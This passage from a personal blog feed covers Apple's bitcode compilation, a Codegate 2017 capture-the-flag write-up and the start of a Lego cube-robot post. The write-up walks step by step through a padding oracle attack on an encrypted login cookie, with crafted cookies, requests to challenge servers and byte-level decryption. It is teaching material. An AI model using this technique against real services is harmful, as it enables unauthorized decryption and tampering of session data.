<p>现在可以理解，为什么苹果要强推bitcode了吧？开发者把bitcode提交到App Store Connect之后，如果苹果发布了使用新芯片的iPhone，支持更高效的指令，开发者不需要做任何操作，App Store Connect自己就可以编译出针对新产品优化过的app并通过App Store分发给用户，不需要开发者自己重新打包上架，这样一来苹果的Store生态就不需要依赖开发者的积极性了。</p>

<h2>0x05 使用Bitcode导出ipa</h2>

<p>前面已经提到，如果要以bitcode方式上传app，必须在开启bitcode的状态下，进行Archive打包，才会得到带有bitcode的app。大部分app都会依赖一堆第三方sdk，如果此时项目里依赖的某一个或者几个sdk没有开启bitcode，那么很遗憾，Xcode会拒绝编译并给出类似这样的提示：</p>

<blockquote><p>ld: &lsquo;name_of_the_library_or_framework&rsquo; does not contain bitcode. You must rebuild it with bitcode enabled (Xcode setting ENABLE_BITCODE), obtain an updated library from the vendor, or disable bitcode for this target.</p>

<p>ld: bitcode bundle could not be generated because &lsquo;name_of_the_library_or_framework&rsquo; was built without full bitcode.</p></blockquote>

<p>第一种提示表示这个第三方库完全没有开启bitcode，而第二种提示表示它只有bitcode-marker，也就是说它的开发者虽然在工程配置中设置了 Enable Bitcode 为 YES，但并没有以Archive方式编译，可能只是⌘ + B，然后顺手把Products拷贝出来交付了。</p>

<p>遇到这种问题，也需要分两种情况来看：</p>

<ul>
<li>如果这个库是在本地编译的， 比如自己项目里或者子项目里的target，或者通过Pods引入了源代码，那么这个target一定没有开启bitcode，在工程中找到这个target的Build Settings把Enable Bitcode置为YES即可</li>
<li>但如果是第三方提供的二进制库文件，则需要联系sdk的提供方确认是否能提供带bitcode的版本，否则只能关闭自己项目中的bitcode。这也是bitcode时至今日都没有得到大面积应用的最大障阻碍。</li>
</ul>


<p>当使用Archive方式打包出带有bitcode的包时，你会发现这个包里的二进制文件比没有开启bitcode时大出了许多，多出来的其实就是bitcode的体积，并且bitcode的体积，一般要比二进制文件本身还要大出许多</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ls -al test.o test_bitcode.o test.bc
</span><span class='line'>-rw-r--r--  1 xelz  staff  2848 12 19 18:42 test.bc
</span><span class='line'>-rw-r--r--@ 1 xelz  staff   784 12 19 18:24 test.o
</span><span class='line'>-rw-r--r--@ 1 xelz  staff  3920 12 19 18:59 test_bitcode.o
</span><span class='line'><span class="nv">$ </span>ls -al <span class="nb">test </span>test_bitcode
</span><span class='line'>-rwxr-xr-x@ 1 xelz  staff   8432 12 19 21:38 <span class="nb">test</span>
</span><span class='line'>-rwxr-xr-x@ 1 xelz  staff  16624 12 19 20:50 test_bitcode
</span></code></pre></td></tr></table></div></figure>


<p>当然，这部分内容并不会导致用户下载到的APP变大，因为用户下载到的代码中只会有机器码，不会包含bitcode。有的项目开启bitcode之后会发现二进制的体积增大到超出了苹果对<a href="https://help.apple.com/app-store-connect/#/dev611e0a21f">二进制体积的限制</a>，但是完全不用担心，苹果的限制只是针对<code>__TEXT</code> 段，而嵌入的bitcode是存储在单独的<code>__LLVM</code> 段，不在苹果的限制范围内。</p>

<p>打包出带有bitcode的xcarchive之后，可以导出Development IPA进行上线前的最终测试，或者上传到App Store Connect进行提审上架。进行此类操作时会发现Xcode Organizer中多出了bitcode相关的选项：</p>

<ul>
<li><p>导出Development版本时，可以勾选<code>Rebuild from Bitcode</code>，这时导出会变的很慢，因为Xcode在后台通过bitcode重新编译代码，这样导出的ipa最接近最终用户从AppStore下载的版本，为什么说是接近呢，因为苹果使用的编译器版本很可能和本地Xcode不一样，并且苹果可能在编译时增加额外的优化步骤，这些都会导致苹果编译后的二进制文件跟本地编译的版本产生差异。而如果不勾选此选项，则会直接使用Archive时编译出的二进制代码，并把bitcode从二进制中去除以减小体积。</p>

<p><img src="http://xelz.info/assets/2018/organizer-export.png" alt="rebuild from bitcode" /></p></li>
<li><p>导出Store版本或者直接进行上传时，默认会勾选<code>Include bitcode for iOS content</code>，如果不勾选，则跟前面类似，将会去除内嵌的bitcode，直接使用本地编译的二进制代码</p>

<p><img src="http://xelz.info/assets/2018/organizer-upload.png" alt="include" /></p>

<p>勾选后生成的ipa中将会<code>只包含bitcode</code>，这个ipa是无法重签后安装到设备上进行测试的，因为里面没有任何可执行代码：</p>

<p><img src="http://xelz.info/assets/2018/machoview1.png" alt="" /></p>

<p><code>__TEXT</code> 和 <code>__DATA</code> 等跟已编译好的二进制相关的内容会被全部去除，但是会保留<code>__LINKEDIT</code>中的部分信息，其中最重要的就是 <code>LC_UUID</code>，用于在重编之后能跟原始的符号文件对应起来，如果用户下载经过AppStore重编之后的app发生了Crash，得到的backtrace地址是跟本地编译的版本对应不起来的，需要结合UUID和从App Store Connect下载的dSYM文件才能得到符号化的crash信息。</p>

<p><img src="http://xelz.info/assets/2018/machoview2.png" alt="" /></p></li>
</ul>


<h2>0x06 拓展阅读</h2>

<h4>bitcode不是bytecode</h4>

<p>bitcode不能翻译为字节码(bytecode)，显然从字面上看这两个词代表的含义并不等同：字节码是按照字节存取的，一般其控制代码的最小宽度是一个字节(也即8个bits)，而bitcode是按位(bit)存取，最大化利用空间。比如用bitcode中使用<code>6-bit characters</code>来编码只包含字母/数字的字符串</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="s1">&#39;a&#39;</span> .. <span class="s1">&#39;z&#39;</span> ---  0 .. 25 ---&gt; 00 0000 .. 01 1001
</span><span class='line'><span class="s1">&#39;A&#39;</span> .. <span class="s1">&#39;Z&#39;</span> --- 26 .. 51 ---&gt; 01 1010 .. 11 0011
</span><span class='line'><span class="s1">&#39;0&#39;</span> .. <span class="s1">&#39;9&#39;</span> --- 52 .. 61 ---&gt; 11 0100 .. 11 1101
</span><span class='line'>       <span class="s1">&#39;.&#39;</span> --- 62       ---&gt; 11 1110
</span><span class='line'>       <span class="s1">&#39;_&#39;</span> --- 63       ---&gt; 11 1111
</span></code></pre></td></tr></table></div></figure>


<p>在这种编码模式下，4字节的字符串<code>abcd</code>只用3个字节就可以表示</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>  char:     a   <span class="p">|</span>    b   <span class="p">|</span>    c   <span class="p">|</span>    d
</span><span class='line'>binary: 00 00 00<span class="p">|</span>00<span class="p">|</span>00 01<span class="p">|</span>00 00<span class="p">|</span>10<span class="p">|</span>00 00 11
</span><span class='line'>   hex:     00     <span class="p">|</span>     10    <span class="p">|</span>    83
</span></code></pre></td></tr></table></div></figure>


<p>完整的编码格式可以参考官方文档<a href="http://llvm.org/docs/BitCodeFormat.html">LLVM Bitcode File Format</a></p>

<h4>bitcode的兼容性</h4>

<p>bitcode的格式目前是一直在变化的，并且无法向前兼容，举例来说Xcode8的编译器无法读取并解析xcode9产生的bitcode。</p>

<p>另外苹果的bitcode格式与社区版LLVM的bitcode有一定差异，但苹果并不会及时开源Xcode最新版编译器的代码，所以如果你使用第三方基于社区版LLVM制作的编译器进行开发，不要尝试开启并提交bitcode到App Store Connect，否则会因为App Store Connect解析不了你的bitcode而被拒。</p>

<h4>bitcode不是架构无关代码</h4>

<p>如果一个app同时要支持armv7和arm64两种架构，那么同一个源代码文件将会被编译出两份bitcode，也就是说，在一开始介绍LLVM的那张图中，并不是代表同一份bitcode代码可以直接被编译为不同目标机器的机器码。</p>

<p>LLVM只是统一了中间语言的结构和语法格式，但不能像Java那样，Compile Once &amp; Run Everywhere.</p>

<h4>如何判断是否开启bitcode</h4>

<p>可以通过otool检查二进制文件，网上有很多类似这样的方法：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>otool -arch armv7 -l xxxx.a <span class="p">|</span> grep __LLVM <span class="p">|</span> wc -l
</span></code></pre></td></tr></table></div></figure>


<p>通过判断是否包含 <code>__LLVM</code> 或者关键字来判断是否支持bitcode，其实这种方式是完全错误的，通过前面的测试可以知道，这种方式区分不了bitcode和bitcode-marker，确定是否包含bitcode，还需要检查otool输出中<code>__LLVM</code> Segment 的长度，如果长度只有1个字节，则并不能代表真正开启了bitcode：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>otool -l test_bitcode.o <span class="p">|</span> grep -A 2  __LLVM <span class="p">|</span> grep size
</span><span class='line'>      size 0x0000000000000b10
</span><span class='line'>      size 0x0000000000000042
</span><span class='line'><span class="nv">$ </span>otool -l test_bitcode_marker.o <span class="p">|</span> grep -A 2  __LLVM <span class="p">|</span> grep size
</span><span class='line'>      size 0x0000000000000001
</span><span class='line'>      size 0x0000000000000001
</span></code></pre></td></tr></table></div></figure>


<h4>bitcode是否能反编译出源代码</h4>

<p>从科学严谨的角度来说，无法给出确定的答案，但是这个问题跟“二进制文件是否能反编译出源代码”是一样的道理。编译是一个将源代码一层一层不断低级化的过程，每一层都可能会丢失一些特性，产生不可逆的转换，把源代码编译为bitcode或是二进制机器码是五十步之于百步的关系。在通常情况下，反编译bitcode跟反编译二进制文件比要相对容易一些，但通过bitcode反编译出和源代码语义完全相同的代码，也是几乎不可能的。</p>

<p>另外，从安全的角度考虑，Xcode 引入了 <code>Symbol Hiding</code> 和 <code>Debug info Striping</code> 机制，在链接时，bitcode中所有非导出符号均被隐藏，取而代之的是 <code>__hidden#0_</code> 或者 <code>__ir_hidden#1_</code> 这样的形式，debug信息也只保留了line-table，所有跟文件路径、标识符、导出符号等相关的信息全部都从bitcode中移除，相当于做了一层混淆，防止源代码级别的信息泄露，可谓是煞费苦心。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate 2017 2D Life writeup]]></title>
    <link href="http://xelz.info/blog/2017/02/20/codegate-2017-2d-life-writeup/"/>
    <updated>2017-02-20T20:00:00+00:00</updated>
    <id>http://xelz.info/blog/2017/02/20/codegate-2017-2d-life-writeup</id>
    <content type="html"><![CDATA[<h3>Description</h3>

<h4>2D Life</h4>

<p>470 points</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://110.10.212.135:24135
</span><span class='line'>http://110.10.212.135:24136
</span><span class='line'>http://110.10.212.147:24135
</span><span class='line'>http://110.10.212.147:24136</span></code></pre></td></tr></table></div></figure>


<p>I didn&rsquo;t have enough time to solve this challenge since I&rsquo;m busy at work. It&rsquo;s a pity that my team didn&rsquo;t, neither. But I have to say it&rsquo;s a very challenging one. Combination of crypto and SQL injection.</p>

<h3>First Sight</h3>

<p>It seemed to be a web challenge because the entrance was a website. So let&rsquo;s start with HTTP requests and responses. In the source code of the page, a path to secret login page was commented.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">&quot;navbar&quot;</span> <span class="na">class=</span><span class="s">&quot;navbar-collapse collapse&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">&quot;nav navbar-nav&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;/&quot;</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
</span><span class='line'>  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;?p=pic&quot;</span><span class="nt">&gt;</span>Pictures<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
</span><span class='line'>  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;?p=music&quot;</span><span class="nt">&gt;</span>Music<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
</span><span class='line'>  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;?p=contact&quot;</span><span class="nt">&gt;</span>Contact<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
</span><span class='line'>  <span class="c">&lt;!--&lt;li&gt;&lt;a href=&quot;?p=secret_login&quot;&gt;Login&lt;/a&gt;&lt;li&gt;--&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/ul&gt;</span>
</span><span class='line'><span class="nt">&lt;/div&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The login page set a cookie like this(using <a href="https://httpie.org/">httpie</a>)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>$ http http://110.10.212.135:24135/\?p\=secret_login
</span><span class='line'>HTTP/1.1 200 OK
</span><span class='line'>Connection: Keep-Alive
</span><span class='line'>Content-Encoding: gzip
</span><span class='line'>Content-Length: 579
</span><span class='line'>Content-Type: text/html; charset=UTF-8
</span><span class='line'>Date: Fri, 10 Feb 2017 05:57:50 GMT
</span><span class='line'>Keep-Alive: timeout=5, max=100
</span><span class='line'>Server: Apache/2.4.18 (Ubuntu)
</span><span class='line'>Set-Cookie: identify=t93ZpEcFoz4%3D%7C6uDGkD5VtEk0H9kAOzOrQECDzRdVuuDYn4h8ISoWSUuetH5Cb%2BBgSfxSd9WfX9RxHGC7cnAZdnmxqneZrLkQ%2Bw%3D%3D
</span><span class='line'>Vary: Accept-Encoding
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s easy to say that the cookie is two parts of base64 encoded string concatenated by a <code>|</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>t93ZpEcFoz4=|6uDGkD5VtEk0H9kAOzOrQECDzRdVuuDYn4h8ISoWSUuetH5Cb+BgSfxSd9WfX9RxHGC7cnAZdnmxqneZrLkQ+w==
</span></code></pre></td></tr></table></div></figure>


<p>Different cookies was returned when repeating the same request. Modify the tail of the cookie will got a message <code>Error has occur from decrypt..</code>, but the head won&rsquo;t.</p>

<!-- more -->


<h3>Cryptography</h3>

<p>Look at the two parts of cookie:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>part 1: t93ZpEcFoz4=
</span><span class='line'>decode: b7 dd d9 a4 47 05 a3 3e
</span><span class='line'>length: 8
</span><span class='line'>
</span><span class='line'>part 2: 6uDGkD5VtEk0H9kAOzOrQECDzRdVuuDYn4h8ISoWSUuetH5Cb+BgSfxSd9WfX9RxHGC7cnAZdnmxqneZrLkQ+w==
</span><span class='line'>decode: ea e0 c6 90 3e 55 b4 49 34 1f d9 00 3b 33 ab 40 40 83 cd 17 55 ba e0 d8 9f 88 7c 21 2a 16 49 4b 9e b4 7e 42 6f e0 60 49 fc 52 77 d5 9f 5f d4 71 1c 60 bb 72 70 19 76 79 b1 aa 77 99 ac b9 10 fb
</span><span class='line'>length: 64
</span></code></pre></td></tr></table></div></figure>


<p>Now I believe it&rsquo;s a <code>Padding Oracle</code> Problem. I&rsquo;ve read about it in <em>Web Security by White Hats</em> (刺总的《白帽子讲Web安全》). <code>Part 1</code> is the 8 bytes <code>iv</code> of encryption, and <code>Part 2</code>, obviously is 8 blocks of encrypted data, with 8 bytes in each block.</p>

<h4>CBC Mode</h4>

<p>Every Block cipher can only deal with a message with fixed length (usually the same length as the key), so plain message is divided into several blocks and each block will be encrypted separately. To avoid data pattern sniffing, a vector is added befor encryption in CBC mode.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>             XOR
</span><span class='line'>plain block ---&gt; |+| ---&gt; intermediate value ---&gt; encrypted block
</span><span class='line'>              ^                           ^
</span><span class='line'>            Vector                    encryption
</span></code></pre></td></tr></table></div></figure>


<p>Vector of each plain data block is the encrypted data of previous block. The Initial Vector for the first data block is provided additionally.</p>

<h4>PKCS#5 Padding</h4>

<p>Length of every block must be exactly the same with the key. In this case, the length is 8 bytes. If there is less than 8 bytes(or just equal to 8 bytes) in the last block, a padding is introduced.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>xx xx xx xx xx xx xx    -&gt; xx xx xx xx xx xx xx 01
</span><span class='line'>xx xx xx xx xx xx       -&gt; xx xx xx xx xx xx 02 02
</span><span class='line'>xx xx xx xx xx          -&gt; xx xx xx xx xx 03 03 03
</span><span class='line'>xx xx xx xx             -&gt; xx xx xx xx 04 04 04 04
</span><span class='line'>xx xx xx                -&gt; xx xx xx 05 05 05 05 05
</span><span class='line'>xx xx                   -&gt; xx xx 06 06 06 06 06 06
</span><span class='line'>xx                      -&gt; xx 07 07 07 07 07 07 07
</span><span class='line'>xx xx xx xx xx xx xx xx -&gt; xx xx xx xx xx xx xx xx
</span><span class='line'>                           08 08 08 08 08 08 08 08
</span></code></pre></td></tr></table></div></figure>


<p>While decrypting, cipher will check the value of the last byte in the decrypted message. Assume that value is 0x04, then check the value of the last 4 bytes. It will be fine if they all equal to 0x04 and the 4 bytes will be directly removed to recover the original length of plain message. Otherwise a decryption exception occured as I tried above.</p>

<h4>Padding Oracle Attack</h4>

<p>We know a bad padding format of the last block will cause exception, so if we craft a fake data which can make the padding match the right format, the data will be accepted by the server without throwing a decryption exception(This does not means it will be completely accepted by server without any other excpetions because the data is totally a mess). At this moment we know the last few bytes in the decrypted message,  is one of the padding format.</p>

<p>We&rsquo;ve got last bytes of plain block and the vector(we craft it), so we can get the last bytes of intermediate value of the corresponding encrypted block by</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>intermediate value  =  plain block with padding  (xor)  craft vector
</span></code></pre></td></tr></table></div></figure>


<p>and then, the real plain block</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>plain block = intermediate value  (xor)  actual vector
</span></code></pre></td></tr></table></div></figure>


<p>To make it clear, we can brute force every byte in a block, from the last byte to the first one.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>|            iv: b7 dd d9 a4 47 05 a3 3e
</span><span class='line'>|encrypted data: ea e0 c6 90 3e 55 b4 49
</span><span class='line'>|                34 1f d9 00 3b 33 ab 40
</span><span class='line'>|                40 83 cd 17 55 ba e0 d8
</span><span class='line'>|                9f 88 7c 21 2a 16 49 4b
</span><span class='line'>|                9e b4 7e 42 6f e0 60 49
</span><span class='line'>|                fc 52 77 d5 9f 5f d4 71
</span><span class='line'>|                1c 60 bb 72 70 19 76 79
</span><span class='line'>|                b1 aa 77 99 ac b9 10 fb
</span></code></pre></td></tr></table></div></figure>


<p>Start with the first block <code>ea e0 c6 90 3e 55 b4 49</code>, enumerate the last byte of iv, from 0x00 to 0xFF.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>|               iv : ff ff ff ff ff ff ff 00
</span><span class='line'>|       iv encoded : /////////wA=
</span><span class='line'>|encrypted message : ea e0 c6 90 3e 55 b4 49
</span><span class='line'>|  message encoded : 6uDGkD5VtEk=
</span><span class='line'>|           cookie : /////////wA=|6uDGkD5VtEk=
</span></code></pre></td></tr></table></div></figure>


<p>visit secure login page with the fake cookie:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>$ http &#39;110.10.212.135:24135/?p=secret_login&#39; cookie:&#39;identity=/////////wA=|6uDGkD5VtEk=&#39;
</span></code></pre></td></tr></table></div></figure>


<p>got the message <code>Error has occur from decrypt..</code></p>

<p>continue trying with different iv(this can be done with a piece of script)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>ff ff ff ff ff ff ff 01
</span><span class='line'>ff ff ff ff ff ff ff 02
</span><span class='line'>...
</span><span class='line'>ff ff ff ff ff ff ff 1f
</span><span class='line'>...
</span></code></pre></td></tr></table></div></figure>


<p>a different message showed up when trying <code>0x1f</code> as the last byte in iv.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>Is that all? HACKER?
</span></code></pre></td></tr></table></div></figure>


<p>BINGO!  It means the padding is 0x01 now(not quite), more clearly, the last byte of the plain message is 0x01.</p>

<p>PS: If the second to last byte in the plain message just happen to be 0x02, then the last byte may be 0x02, too. Both 0x01 and 0x02 are valid at this situation. Just change the last 0xff in iv to any other value and try again, which will break the combination of  <code>0x02 0x02</code> padding (into <code>0x?? 0x02</code>). If nothing different with 0xff(no decrypt error occuring), 0x01 is the right answer.</p>

<p>the last byte of intermediate value can be calculated by</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>intermediate value = iv   (xor)   plain message
</span><span class='line'>        1e         = 1f    (+)         01
</span></code></pre></td></tr></table></div></figure>


<p>and then calculate the last byte of original plain message by the original iv</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>plain message = iv   (xor)   intermediate value
</span><span class='line'>      20      = 3e    (+)           1e
</span></code></pre></td></tr></table></div></figure>


<p>The last byte of the first plain block is <code>0x20</code>!</p>

<p>Next byte, we need to make the plain message have a value of 0x02 in the last byte, to test the <code>0x02 0x02</code> padding. So last byte of iv must be <code>0x02 (+) 0x1e = 0x1c</code></p>

<p>Trying like this</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>ff ff ff ff ff ff 00 1c
</span><span class='line'>ff ff ff ff ff ff 01 1c
</span><span class='line'>ff ff ff ff ff ff 02 1c
</span><span class='line'>...
</span><span class='line'>ff ff ff ff ff ff ff 1c
</span></code></pre></td></tr></table></div></figure>


<p><code>ff ff ff ff ff ff e4 1c</code> will make the sense.  <code>0xe4 (+) 0x02 (+) 0xa3 = 0x45</code></p>

<p>Finally we can get the first block:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>|                iv : b7 dd d9 a4 47 05 a3 3e
</span><span class='line'>|intermediate value : fa 98 8a f7 06 42 e6 1e
</span><span class='line'>|     plain message : 4d 45 53 53 41 47 45 20
</span><span class='line'>|        plain text : M  E  S  S  A  G  E
</span></code></pre></td></tr></table></div></figure>


<p>Continue with the next block:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>34 1f d9 00 3b 33 ab 40
</span></code></pre></td></tr></table></div></figure>


<p>Notice that the original vector of this block is the previous enctyped block <code>ea e0 c6 90 3e 55 b4 49</code>, not the iv.</p>

<p>After all the entire message came out:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>MESSAGE FROM SPY<span class="c">&lt;!--TABLE:agents NUMBER OF COLUMNS:5--&gt;</span>;SPY;66
</span></code></pre></td></tr></table></div></figure>


<h3>SQL Injection</h3>

<p>We didn&rsquo;t got the flag but a hint</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>Table: agents
</span><span class='line'>columns: 5
</span></code></pre></td></tr></table></div></figure>


<p>It should be a SQL injection attack.</p>

<p>I dinn&rsquo;t solve this until the server was shut down. TAT</p>

<p><a href="http://crypto.rop.sh/post/71CBLOYIN034">Writeup by cnc</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[我的玩具——乐高魔方机器人]]></title>
    <link href="http://xelz.info/blog/2017/02/18/lego-cube-solver/"/>
    <updated>2017-02-18T20:00:00+00:00</updated>
    <id>http://xelz.info/blog/2017/02/18/lego-cube-solver</id>
    <content type="html"><![CDATA[<p>视频预览</p>

<p>优酷视频:</p>

<iframe height=490 width='100%' src='http://player.youku.com/embed/XMjUyMDcxMDk1Mg==' frameborder=0 'allowfullscreen'></iframe>


<p>Youtube:</p>

<iframe width="100%" height="450" src="https://www.youtube.com/embed/lXMsFn_69Dw" frameborder="0" allowfullscreen></iframe>


<h2>0x00 简要说明</h2>

<p><strong>硬件环境</strong>：Lego NXT 8547, iPhone 4S(需越狱)</p>

<p><strong>软件依赖</strong>：LeJOS, BTStack, OpenCV2</p>

<p><strong>还原效率</strong>：扫描10~15秒，计算&lt;1秒，还原~1分钟</p>

<p><strong>Github</strong>：<a href="https://github.com/xelzmm/ios-lego-cube-solver">iOS控制器</a>  <a href="https://github.com/xelzmm/lego-cube-solver">Lego机器人</a></p>

<!-- more -->


<h2>0x01 Lego &amp; Tilted Twister</h2>

<p>5年前心血来潮，为了做一个能自动拧魔方的机器人，买了一套乐高8547，按当时的收入算，简直是花了一笔巨款(默默心疼3秒)，之后就开始各种折腾。折腾了两天实在受不了那个中看不中用的GUI编程套件，直接刷了<a href="http://www.lejos.org">LeJOS</a>(Lego Java OS)，它提供了Java Runtime，可以愉快地使用Java进行coding。</p>

<p><img src="http://xelz.info/assets/2017/lego-8547.jpg" alt="lego-8547" /></p>

